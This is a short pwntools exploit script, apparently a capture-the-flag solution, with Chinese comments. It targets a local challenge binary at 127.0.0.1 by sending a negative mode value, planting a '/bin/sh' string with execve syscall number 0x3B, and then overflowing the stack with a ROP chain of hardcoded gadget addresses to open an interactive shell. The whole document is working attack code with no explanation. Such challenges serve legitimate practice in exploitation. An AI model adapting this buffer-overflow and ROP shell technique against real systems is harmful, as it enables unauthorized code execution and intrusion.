from pwn import *
import ctypes                              # 
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
#io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect("127.0.0.1",43857)          

io.sendlineafter(b'choose mode\n',b'-32')
payload1 = p32(0x3B) + b'bin/sh\x00'
io.sendlineafter(b'Input your password\n',payload1)

bin_addr = 0x404084
system = 0x401230
pop_rdi_addr = 0x401240
pop_rax_addr = 0x401244
ret = 0x40101a

payload_2 = b'A'*(0x40 + 8) + p64(pop_rdi_addr) + p64(bin_addr) + p64(0) + p64(0)
payload_2 += p64(pop_rax_addr) + p64(0x3B)
payload_2 += p64(system)
io.sendlineafter(b'Developer Mode.\n',payload_2)
io.interactive()
